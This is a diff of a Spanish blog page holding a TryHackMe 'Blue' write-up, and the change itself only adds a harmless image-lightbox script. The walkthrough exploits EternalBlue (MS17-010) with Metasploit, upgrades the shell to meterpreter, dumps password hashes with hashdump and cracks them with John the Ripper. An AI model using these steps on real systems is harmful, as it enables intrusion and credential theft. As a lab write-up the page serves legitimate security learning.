@@ -81,7 +81,7 @@
 
 <p>Ya por el nombre de la máquina, podemos darnos una idea de por donde van los tiros, ¿quizá <code class="language-plaintext highlighter-rouge">EternalBlue</code>?</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/1.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/1.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>
 
@@ -183,11 +183,11 @@
 
 <p>Si recordamos, lo más relevante que encontramos con nuestro escaneo de versiones y servicios con <em>Nmap</em>, es el puerto <code class="language-plaintext highlighter-rouge">445</code>, o protocolo <code class="language-plaintext highlighter-rouge">SMB</code> (Server Message Block).</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/2.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/2.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>De modo que procederemos a utilizar los scripts específicos con los que cuenta <em>Nmap</em>, para detectar vulnerabilidades en dicho protocolo.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/3.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/3.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Para poder utilizarlos podemos hacer lo siguiente:</p>
 
@@ -215,7 +215,7 @@
   </tbody>
 </table>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/4.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/4.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Como podemos darnos cuenta, esta máquina es vulnerable a <code class="language-plaintext highlighter-rouge">MS17-010</code>, o también conocido como <code class="language-plaintext highlighter-rouge">EternalBlue</code>.</p>
 
@@ -234,7 +234,7 @@
 search ms17-010
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/5.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/5.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Posteriormente elegiremos el <em>exploit</em> a utilizar; de hecho, una de las preguntas de la plataforma justamente es, introducir el <em>exploit</em> que vamos a utilizar.</p>
 
@@ -246,17 +246,17 @@ search ms17-010
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show options
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/6.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/6.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set LHOST &lt;nuestra IP&gt; 
 set RHOST &lt;IP víctima&gt;
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/7.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/7.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez hemos configurado dichos parámetros, bastará con empezar con el ataque, consiguiéndonos <em>Metasploit</em> una shell dentro de la máquina víctima.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/8.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/8.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez llegados a este punto, <em>TryHackMe</em> nos pide convertir nuestra shell actual, en <code class="language-plaintext highlighter-rouge">meterpreter</code>, para ello tendremos que abandonar nuestra sesión actual <code class="language-plaintext highlighter-rouge">Ctrl + Z</code>.</p>
 
@@ -275,7 +275,7 @@ set RHOST &lt;IP víctima&gt;
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show options
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/9.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/9.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions
 set SESSION 1
@@ -284,7 +284,7 @@ run
 
 <p>La opción <code class="language-plaintext highlighter-rouge">sessions</code> nos permite listar todas las sesiones que tengamos activas; esto es útil si tenemos más de una sesión activa, y necesitamos indicar una en particular.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/10.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/10.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez hemos conseguido un <code class="language-plaintext highlighter-rouge">meterpreter</code>, podemos volver a nuestra sesión.</p>
 
@@ -295,11 +295,11 @@ run
 
 <p><em>TryHackMe</em> nos indica que a través del comando <code class="language-plaintext highlighter-rouge">migrate &lt;ID del proceso&gt;</code>, podemos convertirnos en el usuario que está corriendo dicho proceso, sin embargo, esto no tiene ningún sentido ya que somos de hecho un usuario con máximos privilegios, somos <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>, de modo que no tiene sentido migrar al usuario que ya somos.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/11.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/11.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Antes de pasar a conseguir las flags de la máquina, la plataforma nos sigue enseñando comandos útiles de <em>Metasploit</em>, en este caso el comando <code class="language-plaintext highlighter-rouge">hashdump</code>, con el cual podemos listar todos los usuarios del sistema, así como sus contraseñas <em>hasheadas</em>.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/12.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/12.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>En esta fase se nos pregunta por el nombre del usuario no predeterminado, es decir, aquel usuario que no sea <em>Guest</em>, o <em>Administrator</em>; finalmente, se nos pide <em>crackear</em> la contraseña de este usuario, para ello utilizaremos la herramienta <code class="language-plaintext highlighter-rouge">John the Ripper</code>, en conjunto del diccionario <a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220209%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20220209T031834Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=d8b079596701be0a466831ad31ee5cc654d2cc6b43291d532f275e51b6e480fb&amp;X-Amz-SignedHeaders=host&amp;actor_id=79855501&amp;key_id=0&amp;repo_id=97553311&amp;response-content-disposition=attachment%3B%20filename%3Drockyou.txt&amp;response-content-type=application%2Foctet-stream">rockyou.txt</a>.</p>
 
@@ -318,7 +318,7 @@ run
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo john --format=NT --wordlist=/dirección/del/diccionario/rockyou.txt nombreArchivo
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/13.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/13.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez hemos <em>crackeado</em> la contraseña que se nos solicitaba, podemos ahora si, pasar a buscar las respectivas flags. En este caso existe un total de 3 flags, las cuales, según indica la plataforma, están escondidas en ubicaciones claves de un sistema <em>Windows</em>, por lo que es aconsejable aprender estas locaciones.</p>
 
@@ -331,7 +331,7 @@ dir
 type flag1.txt
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/14.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/14.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>La segunda flag dice que se encuentra en una ubicación donde se almacenan las contraseñas dentro de Windows, dicho de otra forma, <code class="language-plaintext highlighter-rouge">C:\Windows\System32\Config</code>.</p>
 
@@ -340,7 +340,7 @@ dir
 type flag2.txt
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/15.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/15.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>La última flag dice que se encuentra en una ubicación donde los administradores suelen tener guardadas cosas “bastante interesantes”, personalmente no tengo idea de donde podría ser esta ubicación así que procederemos a buscar el archivo <code class="language-plaintext highlighter-rouge">flag3.txt</code>, dentro de todo el sistema, para ello tendremos que ir a la raíz del sistema, y empezar a buscar desde ahí:</p>
 
@@ -348,7 +348,7 @@ type flag2.txt
 dir flag3.txt /s /p 
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/16.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/16.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Dudo mucho que los administradores guarden archivos importantes en una ubicación así, no obstante, es la plataforma la que nos comenta esto, y además, es aquí donde se encuentra la tercera y última flag, de modo que nos dirigiremos a esa ubicación para leer la flag.</p>
 
@@ -357,9 +357,42 @@ dir
 type flag3.txt  
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/17.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/17.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 </article>
+
+<div class="image-overlay" onclick="closeImage()"></div>
+<img id="expandedImage" class="expanded-image">
+
+<script>
+function expandImage(img) {
+  var expandedImg = document.getElementById("expandedImage");
+  var overlay = document.querySelector(".image-overlay");
+
+  expandedImg.src = img.src;
+
+  overlay.style.display = "block";
+  expandedImg.style.display = "block";
+
+  document.addEventListener("keydown", handleEscKey);
+}
+
+function closeImage() {
+  var expandedImg = document.getElementById("expandedImage");
+  var overlay = document.querySelector(".image-overlay");
+
+  overlay.style.display = "none";
+  expandedImg.style.display = "none";
+
+  document.removeEventListener("keydown", handleEscKey);
+}
+
+function handleEscKey(event) {
+  if (event.key === "Escape" || event.key === "Esc") {
+    closeImage();
+  }
+}
+</script>
 
       </section>
     </div>
